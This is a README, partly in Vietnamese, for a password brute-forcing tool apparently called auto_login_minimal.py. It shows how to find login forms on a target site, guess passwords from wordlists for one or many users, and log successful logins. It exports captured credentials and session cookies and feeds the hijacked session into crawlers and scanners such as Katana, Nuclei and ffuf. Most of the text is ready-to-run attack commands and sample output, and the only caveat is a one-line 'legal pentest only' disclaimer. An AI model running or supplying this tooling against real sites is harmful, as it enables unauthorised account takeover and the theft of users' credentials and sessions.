Auto Login Finder - MINIMAL VERSION
NO COLORS, JUST LOGS TO FILES
Output Files
Tool này chỉ tạo ra các file output để công cụ khác sử dụng:
1. attack.log
Log toàn bộ quá trình attack:
[2024-01-29 10:30:00] [INFO] Searching for login pages...
[2024-01-29 10:30:01] [SUCCESS] Found login page: https://target.com/login
[2024-01-29 10:30:05] [INFO] Starting brute-force for user: admin
[2024-01-29 10:30:10] [INFO] Progress: 10/100
[2024-01-29 10:30:15] [SUCCESS] LOGIN SUCCESS - Username: admin, Password: password123
[2024-01-29 10:30:16] [SUCCESS] Session saved to: session_cookies.json
2. session_cookies.json
Session data để dùng với Katana hoặc tools khác:
json{
  "timestamp": "2024-01-29T10:30:16",
  "cookies": {
    "sessionid": "abc123",
    "csrftoken": "xyz789"
  },
  "headers": {
    "User-Agent": "Mozilla/5.0..."
  },
  "tokens": {
    "csrftoken": "xyz789",
    "sessionid": "abc123"
  },
  "cookie_string": "sessionid=abc123; csrftoken=xyz789",
  "base_url": "https://target.com"
}
3. katana_command.txt
Command sẵn sàng để chạy Katana:
bash# Katana command - Generated: 2024-01-29 10:30:16
katana -u https://target.com \
  -H 'Cookie: sessionid=abc123; csrftoken=xyz789' \
  -H 'User-Agent: Mozilla/5.0...' \
  -depth 3 -jc -kf all -o katana_results.txt
4. found_credentials.json
Tất cả credentials tìm được:
json[
  {
    "username": "admin",
    "password": "password123",
    "message": "Success keywords found",
    "response_info": {
      "status_code": 200,
      "url": "https://target.com/dashboard",
      "headers": {...},
      "cookies": {...}
    }
  }
]
Cài đặt
bashpip install requests beautifulsoup4
Sử dụng
Basic usage
bashpython auto_login_minimal.py \
  -u https://target.com \
  -U admin \
  -w passwords.txt
Với custom log file
bashpython auto_login_minimal.py \
  -u https://target.com \
  -U admin \
  -w passwords.txt \
  --log-file my_attack.log
Với proxy
bashpython auto_login_minimal.py \
  -u https://target.com \
  -U admin \
  -w passwords.txt \
  --proxy http://127.0.0.1:8080
Multiple users
bashpython auto_login_minimal.py \
  -u https://target.com \
  --userlist users.txt \
  -w passwords.txt \
  --export-creds results.json
Tham số
-u, --url              Target URL (required)
-U, --username         Single username
--userlist             File chứa usernames
-w, --wordlist         Password wordlist (required)
-t, --threads          Threads (default: 5)
-d, --delay            Delay giữa requests (default: 0.5s)
--proxy                Proxy URL
--success              Success indicators
--failure              Failure indicators
--find-only            Chỉ tìm forms, không attack
--deep-scan            Deep scan
--log-file             Log file (default: attack.log)
--export-creds         Export credentials (default: found_credentials.json)
Workflow

Tìm login page → Log vào attack.log
Extract forms → Log vào attack.log
Brute-force → Log progress vào attack.log
Nếu thành công:

Log SUCCESS vào attack.log
Tạo session_cookies.json
Tạo katana_command.txt
Tạo found_credentials.json


Nếu thất bại:

Tìm registration page
Đăng ký stupen4sec@gmail.com / PentestP@ssw0rd
Login lại
Nếu OK → tạo các file output



Parse output files
Python
pythonimport json

# Đọc credentials
with open('found_credentials.json') as f:
    creds = json.load(f)
    for cred in creds:
        print(f"{cred['username']}:{cred['password']}")

# Đọc session
with open('session_cookies.json') as f:
    session = json.load(f)
    cookie_string = session['cookie_string']
    print(f"Cookie: {cookie_string}")
Bash
bash# Extract cookie string
cat session_cookies.json | grep cookie_string | cut -d'"' -f4

# Run Katana
bash katana_command.txt

# Count found credentials
cat found_credentials.json | jq length
jq
bash# Get all usernames
jq '.[].username' found_credentials.json

# Get all passwords
jq '.[].password' found_credentials.json

# Get credentials as user:pass
jq -r '.[] | "\(.username):\(.password)"' found_credentials.json
Integration với tools khác
1. Katana
bash# Auto-generated command
bash katana_command.txt

# Custom
COOKIE=$(cat session_cookies.json | jq -r '.cookie_string')
katana -u https://target.com -H "Cookie: $COOKIE" -depth 5
2. Nuclei
bashCOOKIE=$(cat session_cookies.json | jq -r '.cookie_string')
nuclei -u https://target.com -H "Cookie: $COOKIE" -t ~/nuclei-templates/
3. ffuf
bashCOOKIE=$(cat session_cookies.json | jq -r '.cookie_string')
ffuf -u https://target.com/FUZZ -w wordlist.txt -H "Cookie: $COOKIE"
4. Burp Suite

Mở session_cookies.json
Copy cookies
Burp → Proxy → Options → Match and Replace
Paste cookies

5. Custom script
pythonimport requests
import json

with open('session_cookies.json') as f:
    session = json.load(f)

cookies = session['cookies']
headers = session['headers']

resp = requests.get(
    'https://target.com/api/data',
    cookies=cookies,
    headers=headers
)

print(resp.json())
Log levels
[INFO]    - Thông tin chung
[SUCCESS] - Thành công (tìm page, login OK, save file OK)
[ERROR]   - Lỗi hoặc thất bại
[RESULT]  - Kết quả cuối cùng (credentials)
Example output
[2024-01-29 10:30:00] [INFO] Searching for login pages...
[2024-01-29 10:30:01] [SUCCESS] Found login page: https://target.com/login
[2024-01-29 10:30:02] [INFO] Total login pages found: 1
[2024-01-29 10:30:02] [INFO] Analyzing forms at: https://target.com/login
[2024-01-29 10:30:03] [INFO] Form #0: URL=https://target.com/login, Method=POST, User=username, Pass=password
[2024-01-29 10:30:03] [INFO] Total forms found: 1
[2024-01-29 10:30:03] [INFO] Loaded 100 passwords
[2024-01-29 10:30:03] [INFO] Attacking 1 username(s)
[2024-01-29 10:30:03] [INFO] Starting brute-force for user: admin
[2024-01-29 10:30:03] [INFO] Passwords: 100, Threads: 5, Delay: 0.5s
[2024-01-29 10:30:08] [INFO] Progress: 10/100
[2024-01-29 10:30:13] [INFO] Progress: 20/100
[2024-01-29 10:30:15] [SUCCESS] LOGIN SUCCESS - Username: admin, Password: password123
[2024-01-29 10:30:15] [INFO] Reason: Success keywords found
[2024-01-29 10:30:15] [INFO] Saving session data...
[2024-01-29 10:30:15] [SUCCESS] Session saved to: session_cookies.json
[2024-01-29 10:30:15] [SUCCESS] Katana command saved to: katana_command.txt
[2024-01-29 10:30:15] [INFO] Cookie string: sessionid=abc123; csrftoken=xyz789
[2024-01-29 10:30:15] [SUCCESS] Found 1 credential(s)
[2024-01-29 10:30:15] [SUCCESS] Credentials exported to: found_credentials.json
[2024-01-29 10:30:15] [RESULT]   admin:password123
Monitoring progress
bash# Tail log file real-time
tail -f attack.log

# Count progress
grep "Progress:" attack.log | tail -1

# Check if success
grep "LOGIN SUCCESS" attack.log

# Check errors
grep "\[ERROR\]" attack.log
Disclaimer
Chỉ dùng cho pentest hợp pháp.

